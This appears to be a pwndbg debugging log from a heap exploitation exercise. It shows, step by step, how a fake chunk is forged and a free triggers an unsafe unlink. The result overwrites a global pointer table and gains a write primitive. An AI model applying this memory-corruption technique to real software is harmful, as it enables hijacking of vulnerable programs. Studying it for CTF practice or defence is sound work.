/*
rdi, rsi, rdx, rcx, r8, r9
*/
//alloc(0x100)
//alloc(0x30)
//alloc(0x80)

pwndbg> x/10gx 0x602140
0x602140:	0x0000000000000000	0x0000000000e05420
0x602150:	0x0000000000e05940	0x0000000000e05980
0x602160:	0x0000000000000000	0x0000000000000000
0x602170:	0x0000000000000000	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
pwndbg> heap
0xe05000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x411, 
  fd = 0xa383231, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05410 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05520 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x411, 
  fd = 0xa4b4f, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05930 FASTBIN {
  prev_size = 0x0, 
  size = 0x41, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05970 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x91, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05a00 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20601, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> x/10gx 0xe05930
0xe05930:	0x0000000000000000	0x0000000000000041
0xe05940:	0x0000000000000000	0x0000000000000000
0xe05950:	0x0000000000000000	0x0000000000000000
0xe05960:	0x0000000000000000	0x0000000000000000
0xe05970:	0x0000000000000000	0x0000000000000091

pwndbg> set *(unsigned long*)(0xe05940) = 0
pwndbg> set *(unsigned long*)(0xe05940+0x8) = 0x20
pwndbg> set *(unsigned long*)(0xe05940+0x10) = 0x602138
pwndbg> set *(unsigned long*)(0xe05940+0x18) = 0x602140
pwndbg> set *(unsigned long*)(0xe05940+0x20) = 0x20
pwndbg> set *(unsigned long*)(0xe05940+0x28) = 0x6161616161616161
pwndbg> set *(unsigned long*)(0xe05940+0x30) = 0x30
pwndbg> set *(unsigned long*)(0xe05940+0x38) = 0x90

pwndbg> x/10gx 0xe05930
0xe05930:	0x0000000000000000	0x0000000000000041
0xe05940:	0x0000000000000000	0x0000000000000020
0xe05950:	0x0000000000602138	0x0000000000602140
0xe05960:	0x0000000000000020	0x6161616161616161
0xe05970:	0x0000000000000030	0x0000000000000090
pwndbg> heap
0xe05000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x411, 
  fd = 0xa383231, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05410 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05520 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x411, 
  fd = 0xa4b4f, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05930 FASTBIN {
  prev_size = 0x0, 
  size = 0x41, 
  fd = 0x0, 
  bk = 0x20, 
  fd_nextsize = 0x602138, 
  bk_nextsize = 0x602140
}
0xe05970 {
  prev_size = 0x30, 
  size = 0x90, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05a00 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20601, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
//free 3

pwndbg> x/20gx 0xe05930
0xe05930:	0x0000000000000000	0x0000000000000041
0xe05940:	0x0000000000000000	0x00000000000206c1
0xe05950:	0x0000000000602138	0x0000000000602140
0xe05960:	0x0000000000000020	0x6161616161616161
0xe05970:	0x0000000000000030	0x0000000000000090
0xe05980:	0x0000000000000000	0x0000000000000000
0xe05990:	0x0000000000000000	0x0000000000000000
0xe059a0:	0x0000000000000000	0x0000000000000000
0xe059b0:	0x0000000000000000	0x0000000000000000
0xe059c0:	0x0000000000000000	0x0000000000000000
pwndbg> heap
0xe05000 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x411, 
  fd = 0xa380a33, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05410 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x111, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05520 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x411, 
  fd = 0xa4b4f, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05930 FASTBIN {
  prev_size = 0x0, 
  size = 0x41, 
  fd = 0x0, 
  bk = 0x206c1, 
  fd_nextsize = 0x602138, 
  bk_nextsize = 0x602140
}
0xe05970 {
  prev_size = 0x30, 
  size = 0x90, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05a00 PREV_INUSE {
  prev_size = 0x0, 
  size = 0x20601, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> x/10gx 0x602140
0x602140:	0x0000000000000000	0x0000000000e05420
0x602150:	0x0000000000602138	0x0000000000000000
0x602160:	0x0000000000000000	0x0000000000000000
0x602170:	0x0000000000000000	0x0000000000000000
0x602180:	0x0000000000000000	0x0000000000000000
pwndbg> x/10gx 0x602138
0x602138:	0x0000000000000000	0x0000000000000000
0x602148:	0x0000000000e05420	0x0000000000602138
0x602158:	0x0000000000000000	0x0000000000000000
0x602168:	0x0000000000000000	0x0000000000000000
0x602178:	0x0000000000000000	0x0000000000000000